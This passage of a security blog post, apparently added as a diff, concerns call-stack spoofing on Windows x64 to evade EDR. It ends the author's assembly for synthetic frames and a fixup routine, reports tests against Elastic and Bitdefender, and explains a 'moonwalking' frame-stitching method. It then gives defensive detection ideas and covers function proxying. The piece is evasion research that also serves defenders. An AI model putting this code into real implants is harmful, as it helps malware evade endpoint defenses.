+    ; ---------------------------------------------------------------------
+
+    mov [rdi + 24], r10                ; Storing OG rdi into param
+    mov [rdi + 88], r11                ; Storing OG rsi into param
+    mov [rdi + 96], r12                ; Storing OG r12 into param
+    mov [rdi + 104], r13                ; Storing OG r13 into param
+    mov [rdi + 112], r14                ; Storing OG r14 into param
+    mov [rdi + 120], r15                ; Storing OG r15 into param
+
+    ; ---------------------------------------------------------------------
+    ; Prepping to move stack args
+    ; ---------------------------------------------------------------------
+
+    xor r11, r11            ; r11 will hold the # of args that have been "pushed"
+    mov r13, [rsp + 30h]     ; r13 will hold the # of args total that will be pushed
+
+    xor r14, r14
+    add r14, 8
+    add r14, [rdi + 56]     ; stack size of RUTS
+    add r14, [rdi + 48]     ; stack size of BTIT
+    add r14, [rdi + 32]     ; stack size of our gadget frame
+    sub r14, 20h            ; first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time
+
+    mov r10, rsp            
+    add r10, 30h            ; offset of stack arg added to rsp
+
+    looping:
+
+        xor r15, r15            ; r15 will hold the offset + rsp base
+        cmp r11, r13            ; comparing # of stack args added vs # of stack args we need to add
+        je finish
+    
+        ; ---------------------------------------------------------------------
+        ; Getting location to move the stack arg to
+        ; ---------------------------------------------------------------------
+        
+        sub r14, 8          ; 1 arg means r11 is 0, r14 already 0x28 offset.
+        mov r15, rsp        ; get current stack base
+        sub r15, r14        ; subtract offset
+        
+        ; ---------------------------------------------------------------------
+        ; Procuring the stack arg
+        ; ---------------------------------------------------------------------
+        
+        add r10, 8
+        push qword [r10]
+        pop qword [r15]     ; move the stack arg into the right location
+
+        ; ---------------------------------------------------------------------
+        ; Increment the counter and loop back in case we need more args
+        ; ---------------------------------------------------------------------
+        add r11, 1
+        jmp looping
+    
+    finish:
+
+
+    ; ----------------------------------------------------------------------
+    ; Pushing a 0 to cut off the return addresses after RtlUserThreadStart.
+    ; ----------------------------------------------------------------------
+
+    push 0
+
+    ; ----------------------------------------------------------------------
+    ; RtlUserThreadStart + 0x14  frame
+    ; ----------------------------------------------------------------------
+    
+    sub    rsp, [rdi + 56]
+    mov    r11, [rdi + 64]
+    mov    [rsp], r11
+               
+    ; ----------------------------------------------------------------------
+    ; BaseThreadInitThunk + 0x21  frame
+    ; ----------------------------------------------------------------------
+
+    sub    rsp, [rdi + 32]
+    mov    r11, [rdi + 40]
+    mov    [rsp], r11
+
+    ; ----------------------------------------------------------------------
+    ; Gadget frame
+    ; ----------------------------------------------------------------------
+    
+    sub    rsp, [rdi + 48]
+    mov    r11, [rdi + 80]
+    mov    [rsp], r11
+
+    ; ----------------------------------------------------------------------
+    ; Adjusting the param struct for the fixup
+    ; ----------------------------------------------------------------------
+
+    mov    r11, rsi                    ; Copying function to call into r11
+
+    mov    [rdi + 8], r12              ; Real return address is now moved into the "OG_retaddr" member
+    mov    [rdi + 16], rbx             ; original rbx is stored into "rbx" member
+    mov    rbx, [rdi]                  ; Fixup address is moved into rbx
+    mov    [rdi], rbx                  ; Fixup member now holds the address of Fixup
+    mov    rbx, rdi                    ; Address of param struct (Fixup) is moved into rbx
+
+    ; ----------------------------------------------------------------------
+    ; Syscall stuff. Shouldn't affect performance even if a syscall isnt made
+    ; ----------------------------------------------------------------------
+    mov    r10, rcx
+    mov    rax, [rdi + 72]
+    
+    jmp    r11
+
+section .text$C
+
+    Fixup: 
+  
+        mov     rcx, rbx
+
+        add     rsp, [rbx + 48]     ; Stack size
+        add     rsp, [rbx + 32]     ; Stack size
+        add     rsp, [rbx + 56]     ; Stack size
+        
+        mov      rbx, [rcx + 16]
+        mov rdi, [rcx + 24]         ; ReStoring OG rdi
+        mov rsi, [rcx + 88]         ; ReStoring OG rsi
+        mov r12, [rcx + 96]         ; ReStoring OG r12
+        mov r13, [rcx + 104]        ; ReStoring OG r13 
+        mov r14, [rcx + 112]        ; ReStoring OG r14
+        mov r15, [rcx + 120]        ; ReStoring OG r15 
+	    jmp      [rcx + 8]
+        </code>
+      </pre>
+  </details>
+</details>
+
+<h1 id="synthetic-frames-vs-elastic--bitdefender">Synthetic Frames vs Elastic + Bitdefender</h1>
+<p>I tested this successfully (so far as I can tell) against Elastic and Bitdefender. Call stack spoofing isn’t a silver bullet; if we’re doing a sacrificial process + creating a remote thread, there’s much more going on than just a suspicious unbacked call site. Something less loud in nature and still popular (I think) is unhooking. Though Elastic does not use userland hooks, BitDefender does, so I tested a POC which performed unhooking with indirect syscalls, one with spoofing, and one without. The video below has more details.</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <iframe width="100%" height="630" src="https://www.youtube-nocookie.com/embed/qFz4B1Vdubc" frameborder="0" allowfullscreen=""></iframe>
+</div>
+
+<h1 id="the-cooler-spoof-moonwalking">The Cooler Spoof: Moonwalking</h1>
+<p>With the synthetic approach, the stack never truly unwinds to its base; the zero causes a premature cutoff for the unwinding process. The SilentMoonWalk project has the capability to create frames of dynamic size. Klezvirus called it moonwalking, but I like to call it “stitching” because of the way the dynamic stack size would “stitch” multiple frames together.</p>
+
+<p>Earlier I stated that stack size was a common attribute used during stack unwinding, but it is not the only one. Interestingly, if a frame that utilizes the <code class="language-plaintext highlighter-rouge">RBP</code> as a frame pointer is followed by a frame which pushes the <code class="language-plaintext highlighter-rouge">RBP</code>, then it is possible to create a frame of dynamic size.</p>
+
+<p>Below the frame setup that we’re going for is on the left, and the walk perspective is on the right.</p>
+
+<p><img src="../assets/img/Spoof_5.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>It’s a complicated setup, hence I didn’t integrate it into my meterpreter reflective loader. But it’s really cool because the stack walk actually unwinds to the base of the stack. The <code class="language-plaintext highlighter-rouge">UWOP_SET_FPREG</code> frame being dynamic in size makes it seem like the implant’s frames get stitched into it frame, hence I like to call it stitching. It still includes the gadget frame so we can regain execution flow in a similar manner to the synthetic frame approach.</p>
+
+<p>Let’s actually break down the necessary components to perform this, though.</p>
+
+<ul>
+  <li>A frame for a function that uses the RBP as a frame pointer (Frame #1)
+    <ul>
+      <li>This can be determined via the operation code within the <code class="language-plaintext highlighter-rouge">UNWIND_CODE</code> of the <code class="language-plaintext highlighter-rouge">RUNTIME_FUNCTION</code> of the frame’s function. If this code is 3 (<code class="language-plaintext highlighter-rouge">UWOP_SET_FPREG</code>), then this function utilizes the <code class="language-plaintext highlighter-rouge">RBP</code> as a frame pointer.</li>
+    </ul>
+  </li>
+  <li>A frame for a function that pushes the RBP (Frame #2)
+    <ul>
+      <li>This can be determined via the operation code being an <code class="language-plaintext highlighter-rouge">UWOP_PUSH_NONVOL</code>, with the operation info in the <code class="language-plaintext highlighter-rouge">UNWIND_CODE</code> being 5 (<code class="language-plaintext highlighter-rouge">RBP_OP_INFO</code>)</li>
+    </ul>
+  </li>
+  <li>The index of the RBP being pushed (was it the first register pushed, or the second, etc.)
+    <ul>
+      <li>We just iterate through the <code class="language-plaintext highlighter-rouge">UNWIND_CODE</code>s of Frame #2 and count how many <code class="language-plaintext highlighter-rouge">UWOP_PUSH_NONVOL</code>s there were until we hit one with <code class="language-plaintext highlighter-rouge">RBP_OP_INFO</code></li>
+    </ul>
+  </li>
+  <li>The offset from the origin frame (ie: <code class="language-plaintext highlighter-rouge">BaseThreadInitThunk + 0x14</code>)
+    <ul>
+      <li>This offset is calculated via the stack address of <code class="language-plaintext highlighter-rouge">BaseThreadInitThunk + 0x14</code> - ( Stack Size of Frame #1 - ( <code class="language-plaintext highlighter-rouge">UNWIND_CODE.FrameOffset</code> of Frame #1 * 16 ) - 8 )</li>
+    </ul>
+  </li>
+</ul>
+
+<p>With this information, we then build our frames like so:</p>
+
+<ol>
+  <li>Create Frame #1</li>
+  <li>Create Frame #2</li>
+  <li>Insert the stack address at an offset above Frame #1. This stack address is equal to the origin frame address, minus the previously mentioned offset. The stack address placement offset is equal to the index of <code class="language-plaintext highlighter-rouge">RBP</code> being pushed, times 8.</li>
+  <li>Create gadget frame</li>
+</ol>
+
+<p>While the spoofed call output may seem similar to the synthetic approach, it actually unwinds to the base of the stack rather than the stack being truncated by a 0.</p>
+
+<p><img src="../assets/img/Spoof_6.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>Note that this was a standalone POC and not implemented into the meterpreter reflective loader, hence all memory addresses are backed by modules. The <code class="language-plaintext highlighter-rouge">LoudSunRun.exe</code> backed frames would be the implant frames had this been implemented.</p>
+
+<h1 id="defensive-considerations">Defensive Considerations</h1>
+<p>The spoofed stack from these techniques can be identified manually by looking weird. For example, in the previously shown spoofed <code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code> call, <code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code> usually won’t return to <code class="language-plaintext highlighter-rouge">SetDefaultCommConfigW</code>, if at all.</p>
+
+<p>These implementations relay on a gadget that jumps to a nonvolatile registers to return execution flow to the implant. This is because nonvolatile registers have their values preserved over function calls; they are a safe place to store the address of a fixup handler and/or a struct with information. A frame with a return address to a <code class="language-plaintext highlighter-rouge">jmp nonvolatile</code> or <code class="language-plaintext highlighter-rouge">jmp [nonvolatile]</code> register should be seen as suspicious. This seems to be something game cheats have actually picked upon, based on <a href="https://secret.club/2020/01/05/battleye-stack-walking.html">this article</a> by the Secret Club.</p>
+
+<p>Additionally, Klezvirus introduced a novel detection in <a href="https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Alessandro%20klezVirus%20Magnosi%20Arash%20waldoirc%20Parsa%20Athanasios%20trickster0%20Tserpelis%20-%20StackMoonwalk%20A%20Novel%20approach%20to%20stack%20spoofing%20on%20Windows%20x64.pdf">his Defcon Talk</a>. His tool, Eclipse, checks if the instruction before the return address isn’t a <code class="language-plaintext highlighter-rouge">call</code>; if there isn’t then a call has been spoofed. If we check our <code class="language-plaintext highlighter-rouge">jmp [rbx]</code> gadget, we can see that the instruction before it definitely isn’t a call.</p>
+
+<p>Even if the instruction before the return address is a <code class="language-plaintext highlighter-rouge">call</code>, Eclipse checks to make sure that the <code class="language-plaintext highlighter-rouge">call</code> is calling the function in the next frame. There is a ton of other interesting and novel techniques in that talk that I can’t cover because I don’t know enough, so please read it if you can.</p>
+
+<h1 id="bonus-function-proxying">Bonus: Function Proxying</h1>
+<p>This technique isn’t stack spoofing but it is intended to address the same defense detection, so I thought it’s worth covering. Essentially, some functions can run callbacks and pass arguments to them, all within a separate thread. This causes a target function to be executed with normal looking call stack without the need for spoofing. See the following posts/projects:</p>
+
+<ul>
+  <li><a href="https://github.com/rad9800/misc/blob/main/bypasses/WorkItemLoadLibrary.c">WorkItemLoadLibrary</a> by rad9800</li>
+  <li><a href="https://0xdarkvortex.dev/hiding-in-plainsight/">Hiding in PlainSight</a> by Paranoid Ninja</li>
+</ul>
+
+<p>While those stacks are completely clean, there’s the possiblity of EDR hooking those WinAPIs needed to perform function proxying. And to unhook them it would require executing other WinAPIs/syscalls which could be detected via call stack again. A chicken and egg problem, sort of. There’s probably a solution to this, I’m just not there yet lol.</p>
+
+<p>Regarding detection opportunities, proxy calling is in a similar case as spoofing stuff, except rather than having a gadget frame, if the “lower api” call is proxied (e.g: to bypass hooks), then the stack will still be missing the typical frames for that function.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This topic is super cool, and there’s more to dig into it. It took a few months, but I think it was worth it. I hope this helped to introduce and explain this (in my opinion) beast of a technique.</p>
+
+<h1 id="credits-and-references">Credits and References</h1>
+<p>A big list of people who helped me or projects/blogs that I referenced during my research.</p>
+
+<ul>
+  <li>KlezVirus - SilentMoonWalk is amazing, and his Defcon talk even more so. Seriously, check the slides and all the Moonwalk talks</li>
+  <li>0xboku - For a ton of help during my internship and guiding me through this topic</li>
+  <li>William Burgess - CallStackMasker, VulcanRaven, and <a href="https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs">this article</a></li>
+  <li>Namaszo - Return address spoofing</li>
+  <li>5pider - Havoc Framework, Kaynldr, ShellcodeTemplate, and for being epic</li>
+  <li>Kudaes - Unwinder</li>
+  <li>mgeeky - ThreadStackSpoofer</li>
+  <li>Paranoid Ninja - Hiding in PlainSight</li>
+  <li>rad9800 - Proxy Loading</li>
+  <li>Kyle Avery - AceLdr</li>
+  <li>realoriginal - TitanLdr</li>
+  <li>spotheplanet - Unhooking code</li>
+</ul>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#Pentesting">Pentesting</a>
+          
+            <a href="/tags#Evasion">Evasion</a>
+          
+            <a href="/tags#Windows">Windows</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id="social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=An+Introduction+into+Stack+Spoofing&amp;url=https%3A%2F%2Fdtsec.us%2F2023-09-15-StackSpoofin%2F" class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdtsec.us%2F2023-09-15-StackSpoofin%2F" class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdtsec.us%2F2023-09-15-StackSpoofin%2F" class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2023-04-24-Sleep/" data-toggle="tooltip" data-placement="top" title="An Introduction into Sleep Obfuscation">← Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2023-11-04-ModuleStompin/" data-toggle="tooltip" data-placement="top" title="Module Stomping">Next Post →</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:dylanttran@cpp.edu" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/susMdT" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/d_tranman" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/susdt" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Dylan Tran
+        &nbsp;•&nbsp;
+      
+      2024
+
+      
+        &nbsp;•&nbsp;
+        <span class="author-site">
+          <a href="https://dtsec.us/">dtsec.us</a>
+        </span>
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
